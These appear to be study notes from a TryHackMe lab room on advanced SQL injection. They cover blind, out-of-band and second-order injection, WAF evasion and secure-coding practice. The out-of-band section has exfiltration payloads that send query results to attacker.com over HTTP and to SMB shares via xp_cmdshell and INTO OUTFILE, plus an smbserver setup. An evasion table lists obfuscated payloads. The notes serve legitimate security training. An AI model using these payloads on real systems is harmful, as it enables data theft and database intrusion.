
In-band SQL Injection

This technique is considered the most common and straightforward type of SQL injection attack. In this technique, the attacker uses the same communication channel for both the injection and the retrieval of data. There are two primary types of in-band SQL injection:  

- **Error-Based SQL Injection**: The attacker manipulates the SQL query to produce error messages from the database. These error messages often contain information about the database structure, which can be used to exploit the database further. Example: `SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))`. If the database version is returned in the error message, it reveals information about the database.
- **Union-Based SQL Injection**: The attacker uses the UNION SQL operator to combine the results of two or more SELECT statements into a single result, thereby retrieving data from other tables. Example: `SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin`.

Inferential (Blind) SQL Injection  

Inferential SQL injection does not transfer data directly through the web application, making exploiting it more challenging. Instead, the attacker sends payloads and observes the application’s behaviour and response times to infer information about the database. There are two primary types of inferential SQL injection:  

- **Boolean-Based Blind SQL Injection**: The attacker sends an SQL query to the database, forcing the application to return a different result based on a true or false condition. By analysing the application’s response, the attacker can infer whether the payload was true or false. Example: `SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)`. The attacker can infer the result if the page content or behaviour changes based on the condition.
- **Time-Based Blind SQL Injection**: The attacker sends an SQL query to the database, which delays the response for a specified time if the condition is true. By measuring the response time, the attacker can infer whether the condition is true or false. For example, `SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--`. If the response is delayed by 5 seconds, the attacker can infer that the condition was true.

  
Out-of-band SQL Injection

Out-of-band SQL injection is used when the attacker cannot use the same channel to launch the attack and gather results or when the server responses are unstable. This technique relies on the database server making an out-of-band request (e.g., HTTP or DNS) to send the query result to the attacker. HTTP is normally used in out-of-band SQL injection to send the query result to the attacker's server. We will discuss it in detail in this room.

Each type of SQL injection technique has its advantages and challenges. Understanding these techniques is crucial for identifying and mitigating SQL injection vulnerabilities in web applications. In-band SQL Injection is easy to exploit and detect but noisy and can be easily monitored. Inferential (Blind) SQL Injection is more challenging to exploit and requires multiple requests but can be used when detailed error messages are unavailable. Out-of-band SQL Injection is less common and highly effective, requires external server control, and relies on the database’s ability to make out-of-band requests. By mastering these techniques, penetration testers can effectively identify and exploit SQL injection vulnerabilities, helping organisations secure their web applications against these critical threats.


Second-order SQL injection, also known as stored SQL injection, exploits vulnerabilities where user-supplied input is saved and subsequently used in a different part of the application, possibly after some initial processing. This type of attack is more insidious because the malicious SQL code does not need to immediately result in a SQL syntax error or other obvious issues, making it harder to detect with standard input validation techniques. The injection occurs upon the second use of the data when it is retrieved and used in a SQL command, hence the name "**Second Order**".


# filter evasion techniques

In advanced SQL injection attacks, evading filters is crucial for successfully exploiting vulnerabilities. Modern web applications often implement defensive measures to sanitise or block common attack patterns, making simple SQL injection attempts ineffective. As pentesters, we must adapt using more sophisticated techniques to bypass these filters. This section will cover such methods, including **character encoding**, **no-quote** SQL injection, and handling scenarios where **spaces** cannot be used. We can effectively penetrate web applications with stringent input validation and security controls by understanding and applying these techniques. 

Character Encoding  
Character encoding involves converting special characters in the SQL injection payload into encoded forms that may bypass input filters.  

- **URL Encoding**: URL encoding is a common method where characters are represented using a percent (%) sign followed by their ASCII value in hexadecimal. For example, the payload `' OR 1=1--` can be encoded as `%27%20OR%201%3D1--`. This encoding can help the input pass through web application filters and be decoded by the database, which might not recognise it as malicious during initial processing.
- **Hexadecimal Encoding**: Hexadecimal encoding is another effective technique for constructing SQL queries using hexadecimal values. For instance, the query `SELECT * FROM users WHERE name = 'admin'` can be encoded as `SELECT * FROM users WHERE name = 0x61646d696e`. By representing characters as hexadecimal numbers, the attacker can bypass filters that do not decode these values before processing the input.
- `Unicode Encoding`: Unicode encoding represents characters using Unicode escape sequences. For example, the string `admin` can be encoded as `\u0061\u0064\u006d\u0069\u006e`. This method can bypass filters that only check for specific ASCII characters, as the database will correctly process the encoded input.



# No-Quote SQL Injection

No-Quote SQL injection techniques are used when the application filters single or double quotes or escapes.

- **Using Numerical Values**: One approach is to use numerical values or other data types that do not require quotes. For example, instead of injecting `' OR '1'='1`, an attacker can use `OR 1=1` in a context where quotes are not necessary. This technique can bypass filters that specifically look for an escape or strip out quotes, allowing the injection to proceed.
- **Using SQL Comments**: Another method involves using SQL comments to terminate the rest of the query. For instance, the input `admin'--` can be transformed into `admin--`, where the `--` signifies the start of a comment in SQL, effectively ignoring the remainder of the SQL statement. This can help bypass filters and prevent syntax errors.
- **Using CONCAT() Function**: Attackers can use SQL functions like `CONCAT()` to construct strings without quotes. For example, `CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)` constructs the string admin. The `CONCAT()` function and similar methods allow attackers to build strings without directly using quotes, making it harder for filters to detect and block the payload.

No Spaces Allowed

When spaces are not allowed or are filtered out, various techniques can be used to bypass this restriction.

- **Comments to Replace Spaces**: One common method is to use SQL comments (`/**/`) to replace spaces. For example, instead of `SELECT * FROM users WHERE name = 'admin'`, an attacker can use `SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'`. SQL comments can replace spaces in the query, allowing the payload to bypass filters that remove or block spaces.
- **Tab or Newline Characters**: Another approach is using tab (`\t`) or newline (`\n`) characters as substitutes for spaces. Some filters might allow these characters, enabling the attacker to construct a query like `SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'`. This technique can bypass filters that specifically look for spaces.
- **Alternate Characters**: One effective method is using alternative URL-encoded characters representing different types of whitespace, such as `%09` (horizontal tab), `%0A` (line feed), `%0C` (form feed), `%0D` (carriage return), and `%A0` (non-breaking space). These characters can replace spaces in the payload.



To summarise, it is important to understand that no single technique guarantees a bypass when dealing with filters or Web Application Firewalls (WAFs) designed to prevent SQL injection attacks. However, here are some tips and tricks that can be used to circumvent these protections. This table highlights various techniques that can be employed to try and bypass filters and WAFs:

|   |   |   |
|---|---|---|
|**Scenario**|**Description**|**Example**|
|**Keywords like SELECT are banned**|SQL keywords can often be bypassed by changing their case or adding inline comments to break them up|SElEcT * FrOm users or SE/**/LECT * FROM/**/users|
|**Spaces are banned**|Using alternative whitespace characters or comments to replace spaces can help bypass filters.|SELECT%0A*%0AFROM%0Ausers or SELECT/**/*/**/FROM/**/users|
|**Logical operators like AND, OR are banned**|Using alternative logical operators or concatenation to bypass keyword filters.|username = 'admin' && password = 'password' or username = 'admin'/**/\|/**/1=1 --|
|**Common keywords like UNION, SELECT are banned**|Using equivalent representations such as hexadecimal or Unicode encoding to bypass filters.|SElEcT * FROM users WHERE username = CHAR(0x61,0x64,0x6D,0x69,0x6E)|
|**Specific keywords like OR, AND, SELECT, UNION are banned**|Using obfuscation techniques to disguise SQL keywords by combining characters with string functions or comments.|SElECT * FROM users WHERE username = CONCAT('a','d','m','i','n') or SElEcT/**/username/**/FROM/**/users|

In real environments, the queries you apply and the visibility of filtered keywords are not directly possible. As a pentester, it is important to understand that SQL injection testing often involves a hit-and-trial approach, requiring patience and perseverance. Each environment can have unique filters and protections, making it necessary to adapt and try different techniques to find a successful injection vector.



# OOB injection

**MySQL and MariaDB**

In MySQL or MariaDB, Out-of-band SQL injection can be achieved using [SELECT ... INTO OUTFILE](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) or [load_file](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file) command. This command allows an attacker to write the results of a query to a file on the server's filesystem. For example:

 `SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';`
        

An attacker could then access this file via an SMB share or HTTP server running on the database server, thereby exfiltrating the data through an alternate channel.

**Microsoft SQL Server (MSSQL)**

In MSSQL, Out-of-band SQL injection can be performed using features like [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16), which allows the execution of shell commands directly from SQL queries. This can be leveraged to write data to a file accessible via a network share:

 `EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';`
        

Alternatively, `OPENROWSET` or `BULK INSERT` can be used to interact with external data sources, facilitating data exfiltration through OOB channels.  

**Oracle**  

In Oracle databases, Out-of-band SQL injection can be executed using the [UTL_HTTP](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html) or [UTL_FILE](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html) packages. For instance, the UTL_HTTP package can be used to send HTTP requests with sensitive data:

 `DECLARE   req UTL_HTTP.REQ;   resp UTL_HTTP.RESP; BEGIN   req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);   UTL_HTTP.GET_RESPONSE(req); END;`
        

Examples of Out-of-band Techniques

Out-of-band SQL injection techniques in MySQL and MariaDB can utilise various network protocols to exfiltrate data. The primary methods include DNS exfiltration, HTTP requests, and SMB shares. Each of these techniques can be applied depending on the capabilities of the MySQL/MariaDB environment and the network setup.  

**HTTP Requests**  

By leveraging database functions that allow HTTP requests, attackers can send sensitive data directly to a web server they control. This method exploits database functionalities that can make outbound HTTP connections. Although MySQL and MariaDB do not natively support HTTP requests, this can be done through external scripts or User Defined Functions (UDFs) if the database is configured to allow such operations.

First, the UDF needs to be created and installed to support HTTP requests. This setup is complex and usually involves additional configuration. An example query would look like `SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;`.

HTTP request exfiltration can be implemented on Windows and Linux (Ubuntu) systems, depending on the database's support for external scripts or UDFs that enable HTTP requests.

**DNS Exfiltration** 

Attackers can use SQL queries to generate DNS requests with encoded data, which is sent to a malicious DNS server controlled by the attacker. This technique bypasses HTTP-based monitoring systems and leverages the database's ability to perform DNS lookups.

As discussed above, MySQL does not natively support generating DNS requests through SQL commands alone, attackers might use other means such as custom User-Defined Functions (UDFs) or system-level scripts to perform DNS lookups.

**SMB Exfiltration**

SMB exfiltration involves writing query results to an SMB share on an external server. This technique is particularly effective in Windows environments but can also be configured in Linux systems with the right setup. an example query would look like `SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';`.

This is fully supported as Windows natively supports SMB/UNC paths. Linux (Ubuntu): While direct UNC paths are more native to Windows, SMB shares can be mounted and accessed in Linux using tools like `smbclient` or by mounting the share to a local directory. Directly using UNC paths in SQL queries may require additional setup or scripts to facilitate the interaction.



**Important Consideration**

It is important to note that the MySQL system variable `secure_file_priv` may be set. When set, this variable contains a directory pathname, and MySQL will only allow files to be written to this specified directory. This security measure helps mitigate the risk of unauthorised file operations. 

- **When secure_file_priv is Set**: MySQL will restrict file operations such as **INTO OUTFILE** to the specified directory. This means attackers can only write files to this directory, limiting their ability to exfiltrate data to arbitrary locations.
- **When secure_file_priv is Empty**: If the `secure_file_priv` variable is empty, MySQL does not impose any directory restrictions, allowing files to be written to any directory accessible by the MySQL server process. This configuration poses a higher risk as it provides more flexibility for attackers.

Attackers typically do not have direct access to check the value of the secure_file_priv variable. As a result, they must rely on hit-and-trial methods to determine if and where they can write files, testing various paths to see if file operations succeed.  

**Preparing**

```php
1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --
```
@@basedir <- good variable to read too

sudo smbserver.py -smb2support -comment "My Logs Server" -debug logs ./tmp

*open port 445 don't forget*




# advanced sql injection

Advanced SQL injection involves a range of sophisticated methods that go beyond basic attacks. Here are a few important advanced techniques that pentesters should be aware of:

HTTP Header Injection

HTTP headers can carry user input, which might be used in SQL queries on the server side. ![user-agent injection](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716922785793)If these inputs are not sanitised, it can lead to SQL injection. The technique involves manipulating HTTP headers (like **User-Agent**, **Referer**, or **X-Forwarded-For**) to inject SQL commands. The server might log these headers or use them in SQL queries. For example, a malicious User-Agent header would look like `User-Agent: ' OR 1=1; --`. If the server includes the User-Agent header in an SQL query without sanitising it, it can result in SQL injection.

In this example, a web application logs the User-Agent header from HTTP requests into a table named logs in the database. The application provides an endpoint at `http://10.201.5.129/httpagent/` that displays all the logged entries from the logs table. When users visit a webpage, their browser sends a User-Agent header, which identifies the browser and operating system. This header is typically used for logging purposes or to tailor content for specific browsers. In our application, this User-Agent header is inserted into the logs table and can then be viewed through the provided endpoint.

Given the endpoint, an attacker might attempt to inject SQL code into the User-Agent header to exploit SQL injection vulnerabilities. For instance, by setting the User-Agent header to a malicious value such as `User-Agent: ' UNION SELECT username, password FROM user; --`, an attacker attempts to inject SQL code that combines the results from the logs table with sensitive data from the user table.

Here is the server-side code that inserts the logs.

 `$userAgent = $_SERVER['HTTP_USER_AGENT']; $insert_sql = "INSERT INTO logs (user_Agent) VALUES ('$userAgent')"; if ($conn->query($insert_sql) === TRUE) {     echo "<p class='text-green-500'>New logs inserted successfully</p>"; } else {     echo "<p class='text-red-500'>Error: " . $conn->error . " (Error Code: " . $conn->errno . ")</p>"; }  $sql = "SELECT * FROM logs WHERE user_Agent = '$userAgent'"; .. ...` 
        

The User-Agent value is inserted into the logs table using an INSERT SQL statement. If the insertion is successful, a success message is displayed. An error message with details is shown if there is an error during insertion.



# Exploiting Stored Procedures

Stored procedures are routines stored in the database that can perform various operations, such as inserting, updating, or querying data. While stored procedures can help improve performance and ensure consistency, they can also be vulnerable to SQL injection if not properly handled.

![process flow of stored procedure](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716922785792)  

Stored procedures are precompiled SQL statements that can be executed as a single unit. They are stored in the database and can be called by applications to perform specific tasks. Stored procedures can accept parameters, which can make them flexible and powerful. However, if these parameters are not properly sanitised, they can introduce SQL injection vulnerabilities.

Consider a stored procedure designed to retrieve user data based on a username:

 `CREATE PROCEDURE sp_getUserData     @username NVARCHAR(50) AS BEGIN     DECLARE @sql NVARCHAR(4000)     SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''     EXEC(@sql) END`
        

In this example, the stored procedure concatenates the @username parameter into a dynamic SQL query. This approach is vulnerable to SQL injection because the input is not sanitised.


# XML and JSON Injection   

  
Applications that parse XML or JSON data and use the parsed data in SQL queries can be vulnerable to injection if they do not properly sanitise the inputs. XML and JSON injection involves injecting malicious data into XML or JSON structures that are then used in SQL queries. This can occur if the application directly uses parsed values in SQL statements.

 `{   "username": "admin' OR '1'='1--",   "password": "password" }`
        

If the application uses these values directly in a SQL query like `SELECT * FROM users WHERE username = 'admin' OR '1'='1'-- AND password = 'password'`, it could result in an injection.



# automation

SQL Injection remains a common threat due to improper implementation of security measures and the complexity of different web frameworks_._ Automating identification and exploiting these vulnerabilities can be challenging, but several tools and techniques have been developed to help streamline this process.![automation of SQL injection](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716923453053)  

Major Issues During Identification

Identifying SQL Injection vulnerabilities involves several challenges, similar to identifying any other server-side vulnerability. Here are the key issues:

- **Dynamic Nature of SQL Queries**: SQL queries can be dynamically constructed, making it difficult to detect injection points. Complex queries with multiple layers of logic can obscure potential vulnerabilities.
- **Variety of Injection Points**: SQL Injection can occur in different parts of an application, including input fields, HTTP headers, and URL parameters. Identifying all potential injection points requires thorough testing and a comprehensive understanding of the application.
- **Use of Security Measures**: Applications may use prepared statements, parameterized queries, and ORM frameworks, which can prevent SQL Injection. Automated tools must be able to differentiate between safe and unsafe query constructions.
- **Context-Specific Detection**: The context in which user inputs are used in SQL queries can vary widely. Tools must adapt to different contexts to accurately identify vulnerabilities.

Few Important Tools

Several renowned tools and projects have been developed within the security community to aid in the automation of finding SQL Injection vulnerabilities. Here are a few well-known tools and GitHub repositories that provide functionalities for detecting and exploiting SQL Injection:

- **[SQLMap](https://github.com/sqlmapproject/sqlmap)**: SQLMap is an open-source tool that automates the process of detecting and exploiting SQL Injection vulnerabilities in web applications. It supports a wide range of databases and provides extensive options for both identification and exploitation. You can learn more about the tool [here](https://tryhackme.com/r/room/sqlmap).
- **[SQLNinja](https://github.com/xxgrunge/sqlninja)**: SQLNinja is a tool specifically designed to exploit SQL Injection vulnerabilities in web applications that use Microsoft SQL Server as the backend database. It automates various stages of exploitation, including database fingerprinting and data extraction. 
- [**JSQL Injection**](https://github.com/ron190/jsql-injection): A Java library focused on detecting SQL injection vulnerabilities within Java applications. It supports various types of SQL Injection attacks and provides a range of options for extracting data and taking control of the database.
- **[BBQSQL](https://github.com/CiscoCXSecurity/bbqsql)**: BBQSQL is a Blind SQL Injection exploitation framework designed to be simple and highly effective for automated exploitation of Blind SQL Injection vulnerabilities. 

Automating the identification and exploitation of SQL injection vulnerabilities is crucial for maintaining web application security. Tools like SQLMap, SQLNinja, and BBQSQL provide powerful capabilities for detecting and exploiting these vulnerabilities. However, it's important to understand the limitations of automated tools and the need for manual analysis and validation to ensure comprehensive security coverage. By integrating these tools into your security workflow and following best practices for input validation and query construction, you can effectively mitigate the risks associated with SQL Injection vulnerabilities.



# best practices

SQL injection is a renowned and pervasive vulnerability that has been a major concern in web application security for years. Pentesters must pay special attention to this vulnerability during their assessments, as it requires a thorough understanding of various techniques to identify and exploit SQL injection points. Similarly, secure coders must prioritise safeguarding their applications by implementing robust input validation and adhering to secure coding practices to prevent such attacks. A few of the best practices are mentioned below: ![best practices for secure coders](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716989793902)

Secure Coders

- **Parameterised Queries and Prepared Statements**: Use parameterised queries and prepared statements to ensure all user inputs are treated as data rather than executable code. This technique helps prevent SQL injection by separating the query structure from the data. For example, in PHP with PDO, you can prepare a statement and bind parameters, which ensures that user inputs are safely handled like `$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username"); $stmt->execute(['username' => $username]);`.
- **Input Validation and Sanitisation**: Implement strong input validation and sanitization to ensure that inputs conform to expected formats. Validate data types, lengths, and ranges, and reject any input that does not meet these criteria. Use built-in functions such as `htmlspecialchars()` and `filter_var()` in PHP to sanitise inputs effectively.
- **Least Privilege Principle**: Apply the principle of least privilege by granting application accounts the minimum necessary database permissions. Avoid using database accounts with administrative privileges for everyday operations. This minimises the potential impact of a successful SQL injection attack by limiting the attacker's access to critical database functions.
- **Stored Procedures**: Encapsulate and validate SQL logic using stored procedures. This allows you to control and validate the inputs within the database itself, reducing the risk of SQL injection. Ensure that stored procedures accept only validated inputs and are designed to handle input sanitization internally.
- **Regular Security Audits and Code Reviews**: Conduct regular security audits and code reviews to identify and address vulnerabilities. Automated tools can help scan for SQL injection risks, but manual reviews are also essential to catch subtle issues. Regular audits ensure that your security practices stay up-to-date with evolving threats.

Pentesters

- **Exploiting Database-Specific Features**: Different database management systems (DBMS) have unique features and syntax. A pentester should understand the specifics of the target DBMS (e.g., MySQL, PostgreSQL, Oracle, MSSQL) to exploit these features effectively. For instance, MSSQL supports the `xp_cmdshell` command, which can be used to execute system commands.
- **Leveraging Error Messages**: Exploit verbose error messages to gain insights into the database schema and structure. Error-based SQL injection involves provoking the application to generate error messages that reveal useful information. For example, using 1' AND 1=CONVERT(int, (SELECT @@version)) -- can generate errors that leak version information.
- **Bypassing WAF and Filters**: Test various obfuscation techniques to bypass Web Application Firewalls (WAF) and input filters. This includes using mixed case (SeLeCt), concatenation (CONCAT(CHAR(83), CHAR(69), CHAR(76), CHAR(69), CHAR(67), CHAR(84))), and alternate encodings (hex, URL encoding). Additionally, using inline comments (/**/) and different character encodings (e.g., %09, %0A) can help bypass simple filters.
- **Database Fingerprinting**: Determine the type and version of the database to tailor the attack. This can be done by sending specific queries that yield different results depending on the DBMS. For instance, SELECT version() works on PostgreSQL, while SELECT @@version works on MySQL and MSSQL.
- **Pivoting with SQL Injection**: Use SQL injection to pivot and exploit other parts of the network. Once a database server is compromised, it can be used to gain access to other internal systems. This might involve extracting credentials or exploiting trust relationships between systems.

Advanced SQL injection testing requires a deep understanding of various techniques and the ability to adapt to different environments. Pentesters should employ various methods, from exploiting database-specific features to bypassing sophisticated filters to thoroughly assessing and exploiting SQL injection vulnerabilities. Methodically documenting each step ensures a comprehensive evaluation of the application's security.



xp_cmdshell to execute commands in mssql

